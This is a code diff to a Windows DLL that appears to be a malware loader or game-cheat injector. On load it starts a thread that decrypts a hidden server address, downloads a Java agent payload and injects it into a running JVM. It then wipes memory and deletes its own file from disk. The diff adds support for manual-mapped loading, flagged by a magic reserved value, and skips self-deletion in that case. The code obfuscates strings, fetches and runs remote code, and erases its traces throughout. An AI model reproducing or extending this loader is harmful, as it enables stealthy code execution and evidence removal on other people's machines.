@@ -6,17 +6,15 @@
 #include "crypt.h"
 
 static HMODULE g_self = nullptr;
+static bool g_mapped = false; // true when loaded via manual mapping
 
-// self-delete: queues the DLL file for deletion on next reboot,
-// or deletes it immediately if no handle is open
-static void self_delete() {
+static void self_cleanup() {
+    if (g_mapped) return; // no file to delete, can't FreeLibrary
+
     wchar_t path[MAX_PATH]{};
-    if (GetModuleFileNameW(g_self, path, MAX_PATH) == 0) return;
-
-    // try immediate delete after FreeLibrary (file should be unlocked)
-    // MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT as fallback
-    if (!DeleteFileW(path)) {
-        MoveFileExW(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
+    if (GetModuleFileNameW(g_self, path, MAX_PATH) > 0) {
+        if (!DeleteFileW(path))
+            MoveFileExW(path, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
     }
 }
 
@@ -25,7 +23,6 @@ static DWORD WINAPI worker(LPVOID param) {
 
     std::vector<uint8_t> payload;
 
-    // ---- CONFIGURE: your server ----
     static constexpr auto enc_host = WENC(L"127.0.0.1");
     static constexpr auto enc_path = WENC(L"/agent.jar");
     auto host = WDEC(enc_host);
@@ -33,25 +30,24 @@ static DWORD WINAPI worker(LPVOID param) {
     int port = 8443;
 
     if (!download_payload(host, path, port, true, payload) || payload.empty()) {
-        self_delete();
-        FreeLibraryAndExitThread(g_self, 0);
+        self_cleanup();
+        if (!g_mapped) FreeLibraryAndExitThread(g_self, 0);
         return 0;
     }
 
     if (!jvm_load_agent(payload.data(), static_cast<int>(payload.size()))) {
         SecureZeroMemory(payload.data(), payload.size());
-        self_delete();
-        FreeLibraryAndExitThread(g_self, 0);
+        self_cleanup();
+        if (!g_mapped) FreeLibraryAndExitThread(g_self, 0);
         return 0;
     }
 
     SecureZeroMemory(payload.data(), payload.size());
     payload.clear();
 
-    // delete the DLL file from disk, then unload from memory
-    self_delete();
+    self_cleanup();
     Sleep(50);
-    FreeLibraryAndExitThread(g_self, 0);
+    if (!g_mapped) FreeLibraryAndExitThread(g_self, 0);
     return 0;
 }
 
@@ -59,6 +55,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
         g_self = hModule;
+        g_mapped = (reinterpret_cast<uintptr_t>(reserved) == 0x4D4D);
         HANDLE t = CreateThread(nullptr, 0, worker, nullptr, 0, nullptr);
         if (t) CloseHandle(t);
     }
